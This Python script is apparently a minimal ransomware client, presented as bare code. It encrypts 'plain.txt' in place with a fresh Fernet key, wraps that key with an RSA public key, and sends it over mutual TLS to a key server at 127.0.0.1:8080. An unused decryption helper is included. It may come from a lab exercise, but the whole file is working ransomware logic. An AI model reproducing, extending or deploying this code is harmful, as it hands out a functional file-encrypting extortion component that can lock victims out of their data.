from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import socket
import ssl

def sendEncryptedKey(eKeyFilePath):
    client_key = 'client.key'
    client_cert = 'client.crt'
    server_cert = 'server.crt'

    port = 8080
    hostname = '127.0.0.1'

    context = ssl.SSLContext(ssl.PROTOCOL_TLS, cafile=server_cert)
    context.load_cert_chain(certfile=client_cert, keyfile=client_key)
    context.load_verify_locations(cafile=server_cert)
    context.verify_mode = ssl.CERT_REQUIRED
    context.options |= ssl.OP_SINGLE_ECDH_USE
    context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2

    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock,
        server_side=False,
        server_hostname=hostname
        ) as ssock:

            with open(eKeyFilePath, 'rb') as file:
                encrypted_key = file.read().strip()

            ssock.sendall(encrypted_key)


def decryptFile(filePath, key):
    FernetInstance = Fernet(key)

    with open(filePath, 'rb') as file:
        ciphertext = file.read()
        plaintext = FernetInstance.decrypt(ciphertext)

    with open(filePath, 'wb') as file:
        file.write(plaintext)

symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

with open('public_key.key', 'rb') as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

with open('encryptedSymmetricKey.key', 'wb') as key_file:
    key_file.write(encryptedSymmetricKey)

filePath = 'plain.txt'

with open(filePath, 'rb') as file:
    file_data = file.read()
    encrypted_data = FernetInstance.encrypt(file_data)

with open(filePath, 'wb') as file:
    file.write(encrypted_data)

sendEncryptedKey('encryptedSymmetricKey.key')
quit()
